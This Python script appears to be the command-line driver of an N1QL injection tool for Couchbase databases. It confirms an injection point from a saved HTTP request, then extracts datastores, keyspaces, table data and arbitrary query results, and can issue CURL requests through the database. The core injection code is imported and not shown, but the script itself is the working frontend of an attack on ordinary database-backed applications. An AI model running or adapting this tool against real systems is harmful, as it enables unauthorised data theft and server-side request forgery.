#!/usr/bin/python3
import sys
import logging
from controllers.argument_parser import ArgumentParser
from controllers.app_initialiser import AppInitialiser
from controllers.n1qlinjector import N1QLInjector

default_encoding = 'utf-8'

arg_parser = ArgumentParser()
args = arg_parser.parse()
initialiser = AppInitialiser(args)
initialiser.init_app()
host = args.host.encode(default_encoding)
request_file_path = args.request

injector = N1QLInjector(request_file_path, host, args.keyword, encoding=default_encoding, proxy=args.proxy, verify=args.validatecerts)
confirmed = injector.confirm_injection()

if not confirmed:
    agree = input("The injection point looks to be not exploitable, would you like to continue? [y/n]: ")
    if agree.strip().lower() != "y":
        sys.exit()
if args.datastores:
    logging.info("[*] Datastores extraction process started")
    logging.info("[*] Extracted data:")
    injector.extract_datastores()
elif args.keyspaces:
    logging.info("[*] Keyspaces extraction process started")
    logging.info("[*] Extracted data:")
    injector.extract_keyspaces(args.keyspaces)
elif args.extract:
    logging.info("[*] Data extraction process started")
    logging.info("[*] Extracted data:")
    injector.extract_data(args.extract)
elif args.query:
    logging.info("[*] Executing query: %s" % args.query)
    logging.info("[*] Extracted data:")
    injector.extract_from_db_binsearch(args.query)
elif args.curl:
    logging.info("[*] Executing CURL:")
    if len(args.curl) == 1:
        injector.curl(args.curl[0])
    elif len(args.curl) == 2:
        injector.curl(args.curl[0], args.curl[1])
    logging.warning("-c/--curl option accepts 1 or 2 parameters! Exited.")